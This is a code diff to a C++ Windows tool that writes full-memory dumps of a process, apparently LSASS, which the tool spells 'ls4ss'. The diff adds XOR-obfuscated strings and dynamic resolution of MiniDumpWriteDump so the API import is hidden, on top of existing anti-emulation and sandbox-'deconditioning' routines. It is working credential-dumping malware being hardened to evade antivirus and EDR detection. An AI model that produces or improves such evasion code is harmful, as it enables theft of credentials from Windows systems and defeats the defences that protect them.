@@ -10,6 +10,7 @@
 #pragma comment(lib, "dbghelp.lib")
 
 
+// Anti Emulation
 
 // https://github.com/dobin/SuperMega/blob/main/data/source/antiemulation/timeraw.c
 int get_time_raw() {
@@ -31,6 +32,50 @@ void antiemulation() {
 }
 
 
+// Dynamic API Import
+
+typedef BOOL(WINAPI* MyDumpPtr)(
+    HANDLE        hProcess,
+    DWORD         ProcessId,
+    HANDLE        hFile,
+    MINIDUMP_TYPE DumpType,
+    PVOID         ExceptionParam,
+    PVOID         UserStreamParam,
+    PVOID         CallbackParam
+    );
+
+MyDumpPtr MiniDWriteD = NULL;
+
+bool resolve_func() {
+    // dbghelp.dll
+    // https://cyberchef.org/#recipe=Unescape_string()XOR(%7B'option':'UTF8','string':'AB'%7D,'Standard',false)To_Hex('0x%20with%20comma',0)&input=ZGJnaGVscC5kbGw
+    BYTE dumpLibraryBytes[] = { 0x25,0x20,0x26,0x2a,0x24,0x2e,0x31,0x6c,0x25,0x2e,0x2d,0x42 };
+    for (size_t i = 0; i < sizeof(dumpLibraryBytes); ++i) { dumpLibraryBytes[i] ^= ((i & 1) == 0 ? 0x41 : 0x42); }
+
+	// MiniDumpWriteDump\0
+    // https://cyberchef.org/#recipe=Unescape_string()XOR(%7B'option':'UTF8','string':'AB'%7D,'Standard',false)To_Hex('0x%20with%20comma',0)&input=TWluaUR1bXBXcml0ZUR1bXBcMA
+    BYTE dumpFunctionBytes[] = { 0x0c,0x2b,0x2f,0x2b,0x05,0x37,0x2c,0x32,0x16,0x30,0x28,0x36,0x24,0x06,0x34,0x2f,0x31,0x42 };
+    for (size_t i = 0; i < sizeof(dumpFunctionBytes); ++i) { dumpFunctionBytes[i] ^= ((i & 1) == 0 ? 0x41 : 0x42); }
+
+    char* dumpLibrary = reinterpret_cast<char*>(dumpLibraryBytes);
+    char* dumpFunction = reinterpret_cast<char*>(dumpFunctionBytes);
+
+    // resolving functions
+    HMODULE hLib = LoadLibraryA(dumpLibrary);
+    if (!hLib) {
+        std::cerr << "Failed to load lib " << dumpLibrary << ": " << GetLastError();
+        return false;
+    }
+    MiniDWriteD = (MyDumpPtr)GetProcAddress(hLib, dumpFunction);
+    if (!MiniDWriteD) {
+        std::cerr << "Failed to get function addr " << dumpFunction << ": " << GetLastError();
+        return false;
+    }
+
+    return true;
+}
+
+
 bool dump_process(DWORD pid) {
 	std::string dumpFileName = std::to_string(pid) + ".csv";
 
@@ -47,7 +92,7 @@ bool dump_process(DWORD pid) {
         return false;
     }
 
-    if (!MiniDumpWriteDump(hProcess, pid, hFile, MiniDumpWithFullMemory, NULL, NULL, NULL)) {
+    if (!MiniDWriteD(hProcess, pid, hFile, MiniDumpWithFullMemory, NULL, NULL, NULL)) {
         std::cerr << "  Failed to create dump: " << GetLastError() << std::endl;
         CloseHandle(hFile);
         CloseHandle(hProcess);
@@ -102,14 +147,19 @@ int main(int argc, char* argv[]) {
     std::cout << "Start\n";
     antiemulation();
 
+    if (! resolve_func()) {
+        std::cerr << "Failed to resolve functions\n";
+        return 1;
+	}
+
     deconditioning(10);
     
     if (argc > 1 && argv[1][0] == '1') {
-		std::cout << "Dumping target\n";
+		std::cout << "Dumping ls4ss\n";
         dump_ls4ss();
     }
     else {
-        std::cout << "Didnt dump target\n";
+        std::cout << "Didnt dump ls4ss\n";
     }
 
     std::cout << "End\n";
